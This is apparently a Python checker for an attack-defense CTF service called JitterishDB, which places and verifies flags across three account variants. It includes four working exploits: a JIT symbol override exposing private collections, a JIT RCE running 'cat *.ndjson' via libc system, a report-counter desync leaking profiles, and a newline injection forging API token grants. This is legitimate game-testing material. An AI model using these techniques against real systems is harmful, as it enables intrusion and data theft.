import json
import random
import re
from contextlib import contextmanager
from functools import wraps
from logging import LoggerAdapter
from typing import Callable, TypeVar, ParamSpec, Awaitable, Generator, Any

from enochecker3 import (
    ChainDB,
    DependencyInjector,
    Enochecker,
    ExploitCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    InternalErrorException,
    MumbleException,
    PutflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
)
from enochecker3.utils import FlagSearcher, assert_in, assert_equals
from httpx import AsyncClient

from client import JitterishClient
from utils import *
from codegen import CodeGenerator, Context, StringConst, expr_value, Collection, Function, undefined

T = TypeVar("T")
P = ParamSpec("P")

checker = Enochecker("JitterishDB", 9400)
app = lambda: checker.app

"""
=== VARIANTS ===
0 = community, private collections, pwn the jit
1 = business, flag in profile, pwn the communication protocol with the support feature
2 = enterprise, private DB with public API, pwn the storage format
(3) = second exploit for 0
"""


def handle_invalid_response_exceptions(f: Callable[P, Awaitable[T]]) -> Callable[P, Awaitable[T]]:
    @wraps(f)
    async def wrapper(*args: P.args, **kwargs: P.kwargs) -> T:
        try:
            return await f(*args, **kwargs)
        except KeyError as e:
            raise MumbleException("Key not found") from e

    return wrapper


@contextmanager
def log_code_on_error(logger: LoggerAdapter, query: Function) -> Generator[None, None, None]:
    try:
        yield
    except:
        print(query.as_script())
        logger.info(f"Here's what we submitted: {query.as_script()}")
        raise


def dump_strings(a: Any) -> str:
    """Pull a flag out of any JSON object. Unicode-safe."""
    if isinstance(a, list):
        return ', '.join(dump_strings(_) for _ in a)
    if isinstance(a, dict):
        return ', '.join(f'{dump_strings(k)}: {dump_strings(v)}' for k, v in a.items())
    return str(a)


# =================================================================================================
# SITUATION 0: COMMUNITY / PUBLIC DATABASE
# =================================================================================================

@checker.havoc(0)
async def havoc_check_static_pages(task: HavocCheckerTaskMessage, logger: LoggerAdapter, client: AsyncClient, db: ChainDB,
                                   di: DependencyInjector) -> None:
    await client.get('/')
    await client.get('/docs')


@checker.putflag(0)
@handle_invalid_response_exceptions
async def putflag_community(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                            db: ChainDB) -> str:
    """
    "Community" account with 2 relations. Flag is in the private one.
    Use with JIT exploits.
    """
    gen = CodeGenerator()
    username = generate_username()
    password = generate_password()
    public_value: str = StringConst(gen).raw()
    public_collection = gen.collection(public_value)
    private_collection = gen.collection(task.flag, private=True)

    client = JitterishClient(logger, httpclient)
    await client.register(username, password,
                          generate_random_string(8, False), generate_random_string(8, False),
                          'community')

    # load some data to our database, including the flag
    await client.get(f'/database/{username}')
    for collection in (public_collection, private_collection):
        for item in collection.items:
            await client.db_append(username, collection.name, expr_value(item))

    await db.set("account", (username, password))
    await db.set("public_collection", (username, public_collection.to_json(), public_value))
    await db.set("private_collection", private_collection.to_json())

    return username


@checker.getflag(0)
@handle_invalid_response_exceptions
async def getflag_community(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                            db: ChainDB) -> None:
    try:
        username, password = await db.get("account")
        collection = Collection.from_json(await db.get("private_collection"))
    except KeyError:
        raise MumbleException("Database info missing")

    client = JitterishClient(logger, httpclient)
    customers = (await client.list_customers())['community']
    if username not in customers:
        logger.info(f'{username} not in {customers}')
        raise MumbleException(f"Customer {username} missing in customer list")

    # login
    await client.login(username, password)

    # check collection is listed
    collections = await client.db_list_collections(username)
    assert_in(collection.name, collections, f"Collection {collection.name} missing in database {username}")

    # retrieve the flag with a random generated custom query
    gen = CodeGenerator()
    function = gen.function_many(max_params=1, max_additional_funcs=2)
    query = gen.flag_query(collection)
    code = function.code.strip() + '\n\n' + query.code
    if random.randint(1, 100) <= 20:
        code = CodeGenerator.uglify(code)
    with log_code_on_error(logger, query):
        param = query.params[0].value if query.params else None
        output = await client.db_query(username, code, query.name, param)
        # assumption: query.value (return value) is always undefined and thus omitted
        assert_equals(output, query.output, "Query has wrong output / flag missing")
        # "expected query result" should already contain the flag
        assert_in(task.flag, repr(output), "Flag missing")  # but let's double-check to be sure

    with log_code_on_error(logger, function):
        param = function.params[0].value if function.params else None
        output = await client.db_query(username, code, function.name, param)
        logger.info(f"## Input: {function.params}")
        logger.info(f"## Output: {output[:-1]}")
        logger.info(f"## Result: {output[-1]}")
        if function.value is not undefined:
            output, result = output[:-1], output[-1]
            assert_equals(result, function.value, "Wrong function result")
        assert_equals(output, function.output, "Wrong function output")


@checker.putnoise(0)
async def putnoise_community(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> None:
    """
    "Community" account with public relation.
    """
    gen = CodeGenerator()
    username = generate_username()
    password = generate_password()
    public_value: str = StringConst(gen).raw()
    collection = gen.collection(public_value)

    client = JitterishClient(logger, httpclient)
    await client.register(username, password,
                          generate_random_string(8, False), generate_random_string(8, False),
                          'community')

    # load some random data to our database
    await client.get(f'/database/{username}')
    for item in collection.items:
        await client.db_append(username, collection.name, expr_value(item))

    await db.set("noise_account", (username, password))
    await db.set("noise_collection", (username, collection.to_json(), public_value))


@checker.getnoise(0)
async def getnoise_community(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                             di: DependencyInjector) -> None:
    try:
        username, password = await db.get("noise_account")
        database, collection, public_value = await db.get("noise_collection")
    except KeyError:
        raise MumbleException("Database info missing")

    # load the putflag account if there's one. Hacky.
    # checks that the public collections from a community account are indeed public to other accounts
    # (and teams can't just lock down accounts that contain flags)
    try:
        flag_db = ChainDB(db.collection, db.task_chain_id.replace('noise', 'flag'))
        database, collection, public_value = await flag_db.get("public_collection")
        logger.info(f"Using the public part of putflag's database/collection ({database} / {collection['name']})")
    except KeyError:
        logger.warning('No related putflag found, use the putnoise database/collection instead')
        pass
    # end of hacky part

    collection = Collection.from_json(collection)

    gen = CodeGenerator()
    query = gen.flag_query(collection)
    function = gen.function_many(max_params=1)
    code = function.code.strip() + '\n\n' + query.code
    if random.randint(1, 100) <= 20:
        code = CodeGenerator.uglify(code)

    # login
    client = JitterishClient(logger, httpclient)
    await client.login(username, password)

    # check collection exists
    collections = await client.db_list_collections(database)
    assert_in(collection.name, collections, f"Collection {collection.name} missing in database {database}")

    # run the function & query
    for f in (function, query):
        with log_code_on_error(logger, f):
            param = f.params[0].value if f.params else None
            output = await client.db_query(database, code, f.name, param)
            if f.value is not undefined:
                output, result = output[:-1], output[-1]
                assert_equals(result, f.value, "Query result is wrong (not undefined)")
            assert_equals(output, f.output, "Query result is wrong (undefined)")


@checker.exploit(0)
async def exploit_jit_symbol_override(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                                      httpclient: AsyncClient) -> bytes | None:
    if not task.attack_info:
        raise InternalErrorException("Missing attack info")
    database = task.attack_info

    # any account will do it
    client = JitterishClient(logger, httpclient)
    await client.register(generate_username(), generate_password(),
                          generate_random_string(8, False), generate_random_string(8, False),
                          'business')

    # get target collections
    try:
        collections = await client.db_list_collections(database)
    except MumbleException as e:
        logger.warning(f'Account {database} does not exist or is not public', exc_info=e)
        return None
    collections = [c for c in collections if 'private' in c]
    # this "function" will override the DataStorage::isPublic symbol from libjit_rt
    code = 'func _ZN11DataStorage8isPublicEv(){ return true; }\n'
    for collection in collections:
        code += f'query hack_{collection} on {collection};'
    all_output = ''
    for collection in collections:
        output = await client.db_query(database, code, f'hack_{collection}', None)
        all_output += dump_strings(output) + ' '
    return searcher.search_flag(all_output)


@checker.exploit(3)
async def exploit_jit_rce(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                          httpclient: AsyncClient) -> bytes | None:
    """this exploit does NOT work with a debug build of libjit_rt. Use the release/minsizerel builds."""
    if not task.attack_info:
        raise InternalErrorException("Missing attack info")
    database = task.attack_info

    # any account will do it
    client = JitterishClient(logger, httpclient)
    await client.register(generate_username(), generate_password(),
                          generate_random_string(8, False), generate_random_string(8, False),
                          'business')

    try:
        await client.db_list_collections(database)
    except MumbleException as e:
        logger.warning(f'Account {database} does not exist or is not public', exc_info=e)
        return None

    # jit_rt_equal leaves string pointers in $rdi if both sides are the same length (alternative: jit_rt_lt).
    # system links to libc's system
    # return 0 ensures we get no error
    code = '''
    func hack() {
        "cat *.ndjson" == "cat *.ndjson";
        system();
        return 0;
    }
    '''.strip()
    all_output = dump_strings(await client.db_query(database, code, 'hack', None))
    return searcher.search_flag(all_output)


# =================================================================================================
# SITUATION 1: BUSINESS / PROFILE / SUPPORT
# =================================================================================================

@checker.putflag(1)
@handle_invalid_response_exceptions
async def putflag_profile(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                          db: ChainDB) -> str:
    """Create a user with the flag in its "custom" profile field"""
    client = JitterishClient(logger, httpclient)

    username = generate_username()
    password = generate_password()
    num_reports = None
    looking_for_job = None
    current_salary = None
    custom = task.flag
    fields = random.choices([True, False], k=3)
    if fields[0]:
        num_reports = random.randrange(0, 100)
    if fields[1]:
        looking_for_job = (random.randrange(0, 2) == 1)
    if fields[2]:
        current_salary = random.randrange(0, 1000000)

    await client.register_raw(username, password,
                              generate_random_string(8, False), generate_random_string(8, False),
                              'business', custom, num_reports, looking_for_job, current_salary)
    # task.flag
    # task.task_id flag id?
    await db.set("profile_account", (username, password, num_reports, looking_for_job, current_salary, custom))
    pass

    return username


@checker.getflag(1)
@handle_invalid_response_exceptions
async def getflag_profile(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                          db: ChainDB) -> None:
    try:
        username, password, num_reports, looking_for_job, current_salary, custom = await db.get("profile_account")

    except KeyError:
        raise MumbleException("Database info missing")

    client = JitterishClient(logger, httpclient)
    await client.login(username, password)
    profile_data = await client.get(f'/session/profile')
    assert_in(task.flag, profile_data.text, "Flag missing")


async def register_random_account(client, random_num_reports=True):
    """
    Register a random "business" account (that will not show up on the user list)
    """
    username = generate_username()
    password = generate_password()
    num_reports = None
    looking_for_job = None
    current_salary = None
    custom = None
    fields = random.choices([True, False], k=4)
    if fields[0] and random_num_reports:
        num_reports = random.randrange(0, 100)
    if fields[1]:
        looking_for_job = (random.randrange(0, 2) == 1)
    if fields[2]:
        current_salary = random.randrange(0, 1000000)
    if fields[3]:
        # TODO: this could be useful words/combinations
        custom = ' '.join(generate_username() for _ in range(random.randint(1, 10)))

    await client.register_raw(username, password, generate_random_string(8, False), generate_random_string(8, False),
                              'business', custom, num_reports, looking_for_job, current_salary)
    # task.flag
    # task.task_id flag id?
    return username, password, num_reports, looking_for_job, current_salary, custom


@checker.putnoise(1)
@handle_invalid_response_exceptions
async def putnoise_profile(task: PutnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                           db: ChainDB) -> None:
    # TODO if a single client registers multiple times, is this fingerprintable?
    # check here that registering with a json status still works
    client = JitterishClient(logger, httpclient)
    username, password, num_reports, looking_for_job, current_salary, custom = await register_random_account(client)
    await client.logout()
    await db.set("profile_noise_account", (username, password, num_reports, looking_for_job, current_salary, custom))


@checker.getnoise(1)
@handle_invalid_response_exceptions
async def getnoise_profile(task: GetnoiseCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                           di: DependencyInjector) -> None:
    try:
        username, password, num_reports, looking_for_job, current_salary, custom = await db.get("profile_noise_account")
    except KeyError:
        raise MumbleException("Database info missing")

    client = JitterishClient(logger, httpclient)
    # we login for both
    # username 1
    await client.login(username, password)
    profile_data = await client.get(f'/session/profile')
    # logger.info(profile_data.text)
    # logger.info(f"Num reports: {num_reports_1},lfj: {looking_for_job_1},current salary: {current_salary_1},custom: {custom_1},reporter: {is_reporter_1}")
    if num_reports:
        assert_in(f'<strong>{num_reports}</strong>', profile_data.text, "num_reports missing")
    if looking_for_job is True:
        assert_in('<strong>looking</strong> for a job', profile_data.text, "looking_for_jobs missing")
    elif looking_for_job is False:
        assert_in('<strong>not</strong> looking for a job', profile_data.text, "looking_for_jobs missing")
    if current_salary:
        assert_in(f'<strong>{current_salary}$</strong>', profile_data.text, "current_salary missing")
    if custom:
        assert_in(custom, profile_data.text, "Custom missing")
    await client.logout()


@checker.havoc(1)
@handle_invalid_response_exceptions
async def havoc_check_user_accounts(task: HavocCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient, db: ChainDB,
                                    di: DependencyInjector) -> None:
    # we need to test the num_reports increment, as the update does not persist after a logout
    actual_num_reports = random.randint(1, 3)
    victims = []

    # register the victims
    for _ in range(0, actual_num_reports):
        client = JitterishClient(logger, httpclient)
        target_username, _, _, _, _, _ = await register_random_account(client)
        victims.append(target_username)
        await client.logout()
        client.client.cookies.clear()

    # register the reporter
    client = JitterishClient(logger, httpclient)
    username, _, _, _, _, _ = await register_random_account(client, random_num_reports=False)
    # report the victims
    response = None
    for v in victims:
        reason = generate_random_string(random.randint(4, 16), False)
        response = await client.report(v, reason)
    if response and not response.url.path.endswith('/'):
        await client.get('/support')
    # after report, the profile num reports entry should match the number of reports we issued
    response = await client.get('/session/profile')
    # the actual number of reports set during profile creation does not matter, the db counts the real reports
    if f'<strong>{actual_num_reports}</strong>' not in response.text:
        logger.info(f'User {username} profile: ' + str(re.findall(r'<strong>.*?</strong>', response.text)))
        raise MumbleException(f"num_reports wrong, expected {actual_num_reports}")
    await client.logout()


async def signup_broken(client: JitterishClient):
    username = generate_username()
    password = generate_password()
    data = {"username": username, "password": password, "firstname": "script", "lastname": "script",
            "status": '{"num_reports":[]}', "account_type": "business"}
    await client.post('/session/register', data=data, follow_redirects=True)
    await client.logout()
    client.client.cookies.clear()
    return username


async def signup_useless(client: JitterishClient):
    username = generate_username()
    password = generate_password()
    await client.register(username, password,
                          generate_random_string(8, False), generate_random_string(8, False),
                          'business')
    await client.logout()
    client.client.cookies.clear()
    return username


@checker.exploit(1)
async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                         httpclient: AsyncClient) -> bytes | None:
    target_user = task.attack_info
    client = JitterishClient(logger, httpclient)
    # signup broken user
    broken = await signup_broken(client)
    # signup padding user
    useless = await signup_useless(client)
    # signup the regular user
    username = generate_username()
    password = generate_password()
    logger.info(f'Exploiting user: {username!r} / {password!r}')
    await client.register(username, password, generate_random_string(8, False), generate_random_string(8, False), 'business')
    reason = generate_username()
    # report padding user
    await client.report(useless, reason)
    # report broken user
    await client.report(broken, reason)
    # report gameserver
    logger.info(f'Exploiting {target_user}')
    await client.report(target_user, reason)
    res = await client.get('/session/profile')
    return searcher.search_flag(res.text)


# =================================================================================================
# SITUATION 2: ENTERPRISE / PRIVATE DATABASE WITH API
# =================================================================================================


@checker.putflag(2)
@handle_invalid_response_exceptions
async def putflag_enterprise(task: PutflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> str:
    """
    "Enterprise" account with API access and a few tokens.
    """
    client = JitterishClient(logger, httpclient)

    username = generate_username()
    password = generate_password()
    await client.register(username, password,
                          generate_random_string(8, False), generate_random_string(8, False),
                          'enterprise')

    for _ in range(random.randint(0, 2)):
        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
    key = await client.api_create(username, {'flag': task.flag, 'ident': task.task_id})
    logger.info(f'key = {key}')
    for _ in range(random.randint(0, 1)):
        await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
    token = generate_token()
    logger.info(f'token = {key}')
    grant_result = await client.api_grant(username, key, token)
    if not grant_result:
        raise MumbleException('Could not grant token auth')
    for _ in range(random.randint(0, 2)):
        await client.api_grant(username, key, generate_token())

    await db.set("info", (username, password, key, token))
    return username


@checker.getflag(2)
@handle_invalid_response_exceptions
async def getflag_enterprise(task: GetflagCheckerTaskMessage, logger: LoggerAdapter, httpclient: AsyncClient,
                             db: ChainDB) -> None:
    try:
        username, password, key, token = await db.get("info")
    except KeyError:
        raise MumbleException("Database info missing")

    client = JitterishClient(logger, httpclient)
    customers = (await client.list_customers())['enterprise']
    if username not in customers:
        logger.info(f'{username} not in {customers}')
        raise MumbleException(f"Customer {username} missing in customer list")

    # key is public?
    keys = await client.api_get(username, 'keys')
    if not isinstance(keys, list): raise MumbleException("Ill-typed api response (keys)")
    assert_in(key, keys, "Key missing")

    # can append to this collection?
    await client.api_create(username, CodeGenerator().any_expr.generate(Context()).value)
    # we might actually test if it's retrievable, but not for now

    # token auth
    payload = await client.api_get(username, 'value', key, token)
    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
    assert_in('flag', payload[0], "Flag missing")
    assert_equals(payload[0]['flag'], task.flag, "Flag missing")

    # user auth
    await client.login(username, password)
    payload = await client.api_get(username, 'value', key)
    if not isinstance(payload, list) or len(payload) < 1: raise MumbleException("Empty/ill-typed api response")
    assert_in('flag', payload[0], "Flag missing")
    assert_equals(payload[0]['flag'], task.flag, "Flag missing")


@checker.exploit(2)
async def exploit_kv_newline_injection(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
                                       httpclient: AsyncClient) -> bytes | None:
    if not task.attack_info:
        raise InternalErrorException("Missing attack info")
    username = task.attack_info
    client = JitterishClient(logger, httpclient)
    my_token = generate_token()

    # get keys
    try:
        keys = (await client.api_get(username))[:10]
    except MumbleException as e:
        logger.warning(f'Account {username} does not exist or has no API', exc_info=e)
        return None

    # hack each key individually
    logger.info(f'Attacking database {username} ({len(keys)} keys)')
    all_output = ''
    for key in keys:
        logger.info(f'write fake token {my_token} for key {key}...')
        # these newlines inject a faked "grant" structure into the database
        data = '{"fake_token":\n' + json.dumps({'key': key, 'token': my_token}) + '\n}'
        await client.post(f'/api/{username}/create', data=data, headers={'Content-Type': 'application/json'})
        response = await client.api_get(username, 'value', key, my_token)
        logger.info(f'Key {key} with fake token {my_token} => {response}')
        all_output += dump_strings(response) + ' '
    return searcher.search_flag(all_output)


if __name__ == "__main__":
    # production: gunicorn -c gunicorn.conf.py "checker:app()"
    import logging

    logging.basicConfig(format=f'[%(asctime)s.%(msecs)03d] %(levelname)-9.9s: %(message)s', level=logging.INFO)
    checker.run(port=8002)
